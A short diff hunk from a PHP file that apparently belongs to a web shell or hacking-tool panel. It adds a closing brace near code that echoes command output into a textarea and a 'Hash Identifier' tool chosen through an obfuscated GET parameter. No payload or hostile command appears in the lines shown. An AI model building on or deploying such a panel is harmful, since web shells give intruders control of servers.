@@ -995,7 +995,7 @@ echo'<br>:: OutPut ::<br><textarea style="width:77%;height:300px ">'.$s.'</texta
         }
         $rx = htmlspecialchars($r);
             echo'<br>:: OutPut::<br><textarea style="width:77%;height:300px" >'.$rx.'</textarea>';
-
+  }
 }elseif ($_GET[net('hashiden')] == "opet") {
  echo "<table class='directory-listing-table'><td>
 <h5>Hash Identifier</h5>Identify and detect unknown hashes using this tool.<hr>
